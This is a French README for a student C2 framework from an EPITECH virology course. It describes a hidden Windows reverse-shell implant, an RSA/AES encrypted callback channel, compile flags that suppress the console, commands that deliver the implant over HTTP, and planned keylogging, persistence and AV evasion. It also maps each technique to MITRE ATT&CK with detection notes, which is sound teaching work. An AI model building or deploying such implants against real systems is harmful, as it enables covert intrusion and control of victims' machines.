# s0P0wn3d — Offensive C2 Framework

> **Projet pédagogique EPITECH — VIROLOGY**
> Usage strictement limité aux environnements de lab autorisés.
> Toute utilisation sur un système sans consentement écrit est illégale.

---

## Table des matières

- [Statut du projet](#statut-du-projet)
- [Architecture](#architecture)
- [Lab Environment](#lab-environment)
- [Installation](#installation)
- [Utilisation](#utilisation)
- [Chiffrement](#chiffrement)
- [MITRE ATT\&CK](#mitre-attck)
- [Known Weaknesses](#known-weaknesses)
- [Sources & Références](#sources--références)

---

## Statut du projet

| Phase | Fonctionnalité | Status |
|-------|---------------|--------|
| 1 | Reverse shell (cmd.exe via pipe anonyme) | ✅ Fonctionnel |
| 1 | C2 server Python | ✅ Fonctionnel |
| 2 | Chiffrement AES-256-CBC | ✅ Fonctionnel |
| 2 | Échange de clé RSA-2048 (OAEP-SHA256) | ✅ Fonctionnel |
| 2 | Preuve de chiffrement (tcpdump/Wireshark) | ✅ Validé |
| 2 | Persistance (Registry Run Key) | 📋 Planifié |
| 3 | AV evasion (obfuscation strings) | 📋 Planifié |
| 3 | Log rollback | 📋 Planifié |
| 3 | Payloads avancés (loot, privesc, keylog) | 📋 Planifié |

---

## Architecture

```
Implant (Windows 10 — 192.168.56.101)
    │
    │  TCP:4444
    │
    │  Handshake RSA-2048 :
    │    SERVER → CLIENT : clé publique RSA (BCRYPT_RSAPUBLIC_BLOB)
    │    CLIENT → SERVER : SESSION_KEY chiffrée RSA-OAEP-SHA256
    │
    │  Données (commandes / réponses) :
    │    [4B total_len][16B IV aléatoire][AES-256-CBC / PKCS#7]
    │
    ▼
C2 Server (Ubuntu 24.04 — 192.168.56.104)
    │
    ▼
Attaquant (shell interactif Python)
```

### Flux détaillé

1. L'implant `.exe` s'exécute sur Windows (sans fenêtre, `-mwindows`)
2. Il se connecte en TCP vers le C2 (retry toutes les 5s si indisponible)
3. **Handshake RSA** : le serveur envoie sa clé publique → l'implant génère
   une `SESSION_KEY` AES-256 aléatoire, la chiffre avec RSA-OAEP-SHA256
   et la renvoie → la clé de session n'est jamais en clair sur le réseau
4. Toutes les communications suivantes sont chiffrées AES-256-CBC avec
   un IV aléatoire par message (via `BCryptGenRandom`)
5. Les commandes sont exécutées via `cmd.exe` avec un pipe anonyme
   (pas de fichier temporaire, pas de nouvelle console visible)

---

## Lab Environment

| Machine | OS | IP | Rôle |
|---------|----|----|------|
| C2 Server | Ubuntu 24.04 LTS | 192.168.56.104 | Attaquant |
| Target | Windows 10 21H2 Eval | 192.168.56.101 | Victime |

**Réseau :** VirtualBox Host-Only `192.168.56.0/24`
- Les deux VMs se voient entre elles
- Isolées d'Internet (sauf `enp0s3` NAT sur Ubuntu pour `apt`)

**Ubuntu — 2 adaptateurs réseau :**
- `enp0s3` → NAT (internet)
- `enp0s8` → Host-Only `192.168.56.104` (communication avec Windows)

---

## Installation

### Prérequis Ubuntu (une seule fois)

```bash
sudo apt install mingw-w64 python3-venv python3-pip -y
python3 -m venv ~/c2server/venv
source ~/c2server/venv/bin/activate
pip install cryptography
```

### Compiler l'implant (cross-compile depuis Ubuntu)

```bash
cd src/implant/core
make cross C2_IP=192.168.56.104 C2_PORT=4444
# Produit : implant.exe (~48KB, statiquement lié)
```

**Flags de compilation :**

| Flag | Rôle |
|------|------|
| `-DCLIENT_IP` | IP du C2 server (hardcodé à la compile) |
| `-DCLIENT_PORT` | Port du C2 server |
| `-DWAIT_FOR_CLIENT` | Retry toutes les 5s si C2 indisponible |
| `-mwindows` | App GUI Windows (pas de console visible) |
| `-static` | Pas de dépendances DLL externes |
| `-s` | Strip les symboles de debug |
| `-lws2_32` | Winsock2 |
| `-lbcrypt` | Windows CNG (RSA-OAEP + BCryptGenRandom) |

### Déployer l'implant sur la VM Windows

```bash
# Depuis Ubuntu : serveur HTTP temporaire
cd src/implant/core
python3 -m http.server 8080

# Depuis la VM Windows (PowerShell)
Invoke-WebRequest -Uri http://192.168.56.104:8080/implant.exe -OutFile C:\Users\target\Desktop\implant.exe
```

---

## Utilisation

### Lancer le C2 Server

```bash
source ~/c2server/venv/bin/activate
cd src/controller/server
python3 c2_server.py
```

### Exécuter l'implant sur Windows

Double-clic sur `implant.exe` — aucune fenêtre n'apparaît.

### Shell interactif

```
[*] Génération de la paire RSA-2048 ... OK (283 octets)
[*] C2 Server Phase 2 — RSA-2048 + AES-256-CBC
[*] Écoute sur 0.0.0.0:4444

[+] Connexion de 192.168.56.101:49673
[+] Handshake RSA OK — session_key: 1870b841f9b27b44…
[+] Shell interactif — 'exit' pour fermer

[192.168.56.101]> whoami
desktop-99de0lj\target

[192.168.56.101]> ipconfig
[...]

[192.168.56.101]> exit
```

---

## Chiffrement

### Protocole hybride RSA-2048 + AES-256-CBC

Le chiffrement combine deux algorithmes :

- **RSA-2048 (asymétrique)** : échange de clé uniquement — la clé publique
  du serveur est envoyée à l'implant qui l'utilise pour chiffrer la
  `SESSION_KEY` avant de la transmettre. Sans la clé privée (qui reste
  en mémoire serveur), la SESSION_KEY est irrecuperable.

- **AES-256-CBC (symétrique)** : chiffrement de tout le trafic
  commandes/réponses. Chaque message utilise un IV de 16 octets
  généré aléatoirement par `BCryptGenRandom` (CSPRNG système Windows).

### Format d'un frame de données

```
[4 octets big-endian : total_len = 16 + len(ciphertext)]
[16 octets           : IV aléatoire]
[? octets            : AES-256-CBC ciphertext (PKCS#7 padded)]
```

### Preuve par capture réseau

```bash
# Capturer le trafic
sudo tcpdump -i enp0s8 -w ~/traffic_encrypted_aes256_rsa2048.pcap port 4444

# Vérifier l'absence de texte clair
strings ~/traffic_encrypted_aes256_rsa2048.pcap | grep -iE "(whoami|target|windows|cmd)"
# Résultat attendu : aucune correspondance
```

---

## MITRE ATT&CK

### Capacités implémentées

| Capacité | Tactic | Technique | ID | Blue Team Note |
|----------|--------|-----------|-----|----------------|
| **Reverse shell** | Execution | Windows Command Shell | T1059.003 | Surveiller les processus `cmd.exe` spawné par un process non-interactif. Détecter `CreateProcess` avec redirection de handles vers une socket. Event ID 4688 (process creation) + Sysmon Event ID 1. |
| **Canal C2 TCP** | Command and Control | Application Layer Protocol | T1071.001 | Connexion TCP sortante persistante vers une IP externe sur un port non-standard (4444). Règle réseau : bloquer les connexions sortantes non whitelistées. Surveiller `netstat` pour les connexions `ESTABLISHED` anormales. |
| **Chiffrement AES-256-CBC** | Defense Evasion | Obfuscated Files or Information | T1027 | Le trafic chiffré empêche l'inspection DPI. Détecter par entropie élevée des flux TCP (> 7.5 bits/octet). Un IDS comportemental peut détecter le pattern de frame fixe `[4B][16B][N*16B]`. |
| **Échange de clé RSA-2048** | Command and Control | Encrypted Channel — Asymmetric Cryptography | T1573.002 | Les 287 premiers octets de chaque connexion contiennent le magic `RSA1` (BCRYPT_RSAPUBLIC_BLOB). Signature détectable à l'établissement de session. Implémenter un proxy SSL-inspection pour intercepter avant chiffrement. |
| **Pipe anonyme (exec)** | Defense Evasion | Process Injection / Masquerading | T1055 | `cmd.exe` spawné sans console (`CREATE_NO_WINDOW`). Sysmon Event ID 1 : détecter `cmd.exe` avec `ParentImage` non-standard. Event ID 4688 avec `CommandLine` vide ou masqué. |

### Capacités planifiées

| Capacité | Tactic | Technique | ID | Blue Team Note |
|----------|--------|-----------|-----|----------------|
| **Persistance Registry** | Persistence | Registry Run Keys / Startup Folder | T1547.001 | Surveiller `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`. Event ID 4657 (Registry modification) ou Sysmon Event ID 13. Comparer la baseline du registre au démarrage. |
| **Keylogger** | Collection | Keylogging | T1056.001 | Hook clavier via `SetWindowsHookEx(WH_KEYBOARD_LL)`. Sysmon Event ID 10 : détection de l'appel à `SetWindowsHookEx`. Antivirus comportemental. |
| **Loot (exfiltration)** | Collection / Exfiltration | Data from Local System | T1005 | Surveiller les accès en lecture aux fichiers sensibles (`SAM`, `NTDS.dit`, `.ssh/`). Event ID 4663. DLP (Data Loss Prevention) sur les flux sortants. |
| **Privesc** | Privilege Escalation | Exploitation for Privilege Escalation | T1068 | Auditer les misconfigurations locales (services avec ACL faibles, paths non quotés). Event ID 4672 (privilèges spéciaux assignés). |

---

## Known Weaknesses

| Faiblesse | Détectabilité | Statut |
|-----------|--------------|--------|
| Magic bytes `RSA1` visibles au handshake | Signature IDS sur les 4 premiers octets du payload | Phase 2 — accepté (clé publique, pas de secret) |
| IP C2 hardcodée à la compilation | Reverse engineering trivial (`strings implant.exe`) | Phase 3 : chiffrement des strings |
| `cmd.exe` visible dans la liste des process | Task Manager / Sysmon | Phase 3 : built-in shell sans spawner cmd.exe |
| Pas de persistance | Reboot = perte d'accès | Phase 2 : Registry Run Key |
| Pas d'obfuscation du binaire | Signatures AV statiques | Phase 3 : XOR string obfuscation, packer |
| Warning winsock2.h (include order) | Code quality | Fix : inverser l'ordre des includes |

---

## Sources & Références

### Cryptographie
- [NIST FIPS 197 — AES](https://csrc.nist.gov/publications/detail/fips/197/final)
- [RFC 8017 — RSA-OAEP](https://datatracker.ietf.org/doc/html/rfc8017)
- [tiny-AES-c](https://github.com/kokke/tiny-AES-c) — implémentation AES embarquée
- [Windows CNG BCrypt API](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/)

### C2 / Architecture (référence architecturale uniquement)
- [Sliver C2](https://github.com/BishopFox/sliver) — implant-to-controller pattern
- [Havoc C2](https://github.com/HavocFramework/Havoc) — architecture de référence

### MITRE ATT&CK
- [T1059.003 — Windows Command Shell](https://attack.mitre.org/techniques/T1059/003/)
- [T1071.001 — Web Protocols](https://attack.mitre.org/techniques/T1071/001/)
- [T1573.002 — Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002/)
- [T1027 — Obfuscated Files](https://attack.mitre.org/techniques/T1027/)
- [T1547.001 — Registry Run Keys](https://attack.mitre.org/techniques/T1547/001/)

### Windows Internals
- [CreateProcess + anonymous pipes](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [BCryptImportKeyPair — BCRYPT_RSAPUBLIC_BLOB format](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptimportkeypair)

---

> ⚠️ Ce projet est réalisé dans un cadre pédagogique strict (EPITECH VIROLOGY).
> Ne jamais utiliser hors d'un environnement de lab déclaré et avec consentement écrit.
> **THIS IS NO JOKE.**
